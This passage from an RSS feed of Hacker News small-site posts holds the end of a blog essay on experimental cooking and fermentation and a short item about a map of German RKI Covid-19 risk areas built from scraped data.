. It engages all your senses: its look, smell, taste, temperature, texture, the sound it makes when you cook/eat it, and the bodily feelings it leaves you with.</span></p> <p><span>A well-executed dish triggers a </span> <em>constellation of inter-related physical and emotional sensations</em> <span> that are too complex to put into words. And its transient nature only adds poetic beauty to it
. </span> <em>You savour the moment until it vanishes</em> <span>.</span></p>  <p><h2><span>The Science &amp; Experimentation
</span></h2></p> <p><span>Cooking is also a science. It is a repeatable process that allows for accumulation of knowledge, through experimentation and diligent documentation. Learning the fundamentals and theory of cooking satisfies the nerdy side of me. And thanks to our collective knowledge amassed over generations, we can reliably create great-tasting foods. </span></p> <p><span>Many cooks use the word "experimental" to describe
: </span></p> <p><li><span>Trying a new known recipe  
</span></li></p> <p><li><span>Cooking without a recipe, but sticking with what has worked well in the past
</span></li></p> <p><span>But being experimental means </span> <em>something different</em> <span> to me. My goal is not 
to make food that tastes good. </span> <em>Discovery</em> <span> is what I am really after.</span></p>  <p><h2><span>Fun + Discovery &gt; Taste</span></h2></p> <p><span>What motivates me in the kitchen is not the outcome of the experiment, but that I </span> <strong>have fun playing</strong> <span> and that I walk away with a </span> <strong>new discovery</strong> <span>. </span></p> <p><span>The "success" of a dish matters much less than the process of trying. It is not the outcome of this particular instance of the dish that appeals to me. But rather the abstract idea that I start with, and having it meet with reality.</span></p> <p><span>In that regard, the anime/manga series "Shokugeki no Soma" ("Food Wars") resonates with me very much
. It's not for everyone, but it's the closest to describing how I feel towards food.</span></p>  <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/seaweed-icecream.png"></p> <p><em>Nori ice cream, with quite a bit of MSG. I liked it. But others said it was weird...</em></p>  <p><h2><span>Alchemy — When Ingredients Are Transformed</span></h2></p> <p><span>My most joyful moments in the kitchen are when </span> <em>seemingly unrelated ingredients</em> <span> (or processes) work together to deliver </span> <em>surprising outcomes</em> <span>. </span></p> <p><span>The process feels like </span> <strong>alchemy</strong> <span> — watching ingredients transform, using a variety of unusual flavour combinations, processing and aging techniques. Finding a new peak on the vast landscape of possible dining experiences.
 Tricking the brain into perceiving ingredients that aren't there
. It is immensely satisfying.
</span></p>  <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/banana%20paste.png"></p> <p><em>Blackened, lacto-fermented banana </em> <span>purée. </span> <em>It looks and takes like preserved olives, only much more interesting.</em> <span> 
﻿</span></p>  <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/scallop.png"></p> <p><em>Lacto-fermented oyster mushrooms, torched. Looks and tastes like scallop, with an added funk.</em></p>  <p><span>I love experimental cooking, for the marriage of art and science. Traditions and 
discovery. Play and chores. </span></p>         


          
            
    </div></div>]]>
            </description>
            <link>https://knowledgeartist.org/articles/51b7b831-515b-4ad0-ad4d-616cbbe180c1/why-i-started-experimental-cooking-a-pursuit-of-joy</link>
            <guid isPermaLink="false">hacker-news-small-sites-24240413</guid>
            <pubDate>Sat, 22 Aug 2020 00:24:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Coronavirus high risk countries visualization according to German RKI]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24240251">thread link</a>) | @yeldiR
<br/>
August 21, 2020 | https://geolic.net/covid19-risk-areas | <a href="https://web.archive.org/web/*/https://geolic.net/covid19-risk-areas">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
    
    <div id="social-box">
        <div id="explainText">
            <div><p>The German Robert-Koch-Institute (RKI) is the legal basis for self-isolation in Germany. If somebody stayed in the last 14 days in one of the international areas that are declared as a Covid-19 risk area by the RKI and arrives to Germany, the person is required to go into quarantine for 2 weeks. However, the RKI only offers its risk area data as a basic text list. I turned this into world map visualization that scrapes the data from the official RKI website every hour.</p><p><i><u>Disclaimer:</u></i> The data shown here may not reflect the correct coverage due to possible errors in the scraping code. Please refer to the </p><u><a href="https://www.rki.de/DE/Content/InfAZ/N/Neuartiges_Coronavirus/Risikogebiete_neu.html" target="_blank">official website of the RKI</a></u><p> to get the complete list.</p></div><p>Did you see a bug? Any data wrongly displayed in the map? Or just want to share some feedback? You can <a href="https://geolic.net/contact">contact me</a> via email or on one of the listed social channels below.</p>
        </div>
        <p><a id="geolic-home">
                <img src="https://geolic.net/wp-content/themes/virtue_child/geotorials/geolic.png">
            </a>
            <a href="https://www.facebook.com/GeolicMaps/" target="_blank">
                <span><i></i></span>
            </a>
            <a href="https://twitter.com/GeolicMaps" target="_blank">
                <span><i></i></span>
            </a>
            <a href="https://www.youtube.com/channel/UCZB2wInFTtTKBvKyP_RmpaA" target="_blank">
                <span><i></i></span>
            </a>
        </p>
        
        <p>
            Covid-19 risk areas
        </p>
        </div>
    
            

</div>]]>
            </description>
            <link>https://geolic.net/covid19-risk-areas</link>
            <guid isPermaLink="false">hacker-news-small-sites-24240251</guid>
            <pubDate>Sat, 22 Aug 2020 00:03:43 GMT</pubDate>
        </item>
    </channel>
</rss>
